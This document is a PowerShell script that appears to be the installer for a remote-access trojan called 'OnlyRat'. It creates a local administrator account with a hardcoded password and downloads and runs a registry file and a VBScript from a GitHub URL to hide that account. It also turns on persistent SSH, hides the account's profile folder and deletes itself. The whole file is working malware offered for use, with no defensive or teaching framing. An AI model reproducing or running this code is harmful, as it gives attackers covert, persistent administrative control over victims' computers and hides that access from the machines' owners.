# Function to generate a random string for directory names
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ })
}

# Function to create a local admin account
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser -Name $uname -Password $pword -FullName $uname -Description "Temporary local admin" -AccountNeverExpires
        Write-Verbose "$uname local user created"
        Add-LocalGroupMember -Group "Administrators" -Member $uname
        Write-Verbose "$uname added to the local administrators group"
    }
    end {
    }
}

# Create admin user
$uname = random_text
$pword = ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force
create_account -uname $uname -pword $pword

# Variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = $PWD.Path

# Go to temp, make working directory
mkdir $path
Set-Location $path

# Registry and VBScript to hide local admin
$regUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg'
$vbsUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/calty.vbs'

try {
    Invoke-WebRequest -Uri $regUrl -OutFile "wrev.reg"
    Invoke-WebRequest -Uri $vbsUrl -OutFile "calty.vbs"
}
catch {
    Write-Error "Failed to download files from $regUrl or $vbsUrl"
}

# Enable persistent SSH
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
    Write-Verbose "SSH service enabled and set to start automatically"
}
catch {
    Write-Error "Failed to enable or start SSH service. Make sure the script is run with elevated permissions."
}

# Install the registry changes
try {
    .\wrev.reg
    .\calty.vbs
}
catch {
    Write-Error "Failed to execute registry or VBScript"
}

# Hide the onlyrat user
try {
    cd C:\Users
    attrib.exe +h +s +r onlyrat
}
catch {
    Write-Error "Failed to hide the user directory"
}

# Clean up and self delete
Set-Location $initial_dir
try {
    Remove-Item -Path "$MyInvocation.MyCommand.Path" -Force
}
catch {
    Write-Error "Failed to self-delete the script"
}
